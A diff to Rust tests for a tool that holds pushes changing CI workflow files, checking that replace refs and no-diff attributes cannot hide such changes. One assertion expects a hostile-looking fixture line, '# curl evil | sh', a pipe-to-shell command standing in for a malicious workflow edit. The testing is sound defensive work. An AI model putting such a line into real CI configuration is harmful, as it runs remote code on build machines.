@@ -65,8 +65,13 @@ fn a_replace_ref_in_the_clone_does_not_make_the_diff_empty() {
         String::from_utf8(plain.stdout).unwrap().contains("ci.yml"),
         "the real commits differ"
     );
-    let PushCheck::Hold(diff) = check_push(Kind::GitHub, None, &GitTrees::of(&root), &base, &tip)
-    else {
+    let PushCheck::Hold(diff) = check_push(
+        Kind::GitHub,
+        None,
+        &GitTrees::of_trusted_store(&root),
+        &base,
+        &tip,
+    ) else {
         panic!("held: a replace ref hides nothing");
     };
     assert!(diff.diff.contains("+# curl evil | sh"));
@@ -81,8 +86,13 @@ fn a_no_diff_attribute_in_the_clone_does_not_turn_the_change_into_binary_files_d
         ".git/info/attributes",
         ".github/workflows/* -diff\n*.yml binary\n",
     );
-    let PushCheck::Hold(diff) = check_push(Kind::GitHub, None, &GitTrees::of(&root), &base, &tip)
-    else {
+    let PushCheck::Hold(diff) = check_push(
+        Kind::GitHub,
+        None,
+        &GitTrees::of_trusted_store(&root),
+        &base,
+        &tip,
+    ) else {
         panic!("held");
     };
     assert!(
@@ -143,9 +153,13 @@ fn the_files_beside_the_workflows_that_decide_what_runs_are_ci_files_too() {
         git(&root, &["add", "-A"]);
         git(&root, &["commit", "-q", "-m", "other"]);
         let tip = sha(&root, "HEAD");
-        let PushCheck::Hold(diff) =
-            check_push(Kind::GitHub, None, &GitTrees::of(&root), &base, &tip)
-        else {
+        let PushCheck::Hold(diff) = check_push(
+            Kind::GitHub,
+            None,
+            &GitTrees::of_trusted_store(&root),
+            &base,
+            &tip,
+        ) else {
             panic!("{file} is held");
         };
         assert_eq!(diff.files, vec![file.to_owned()]);
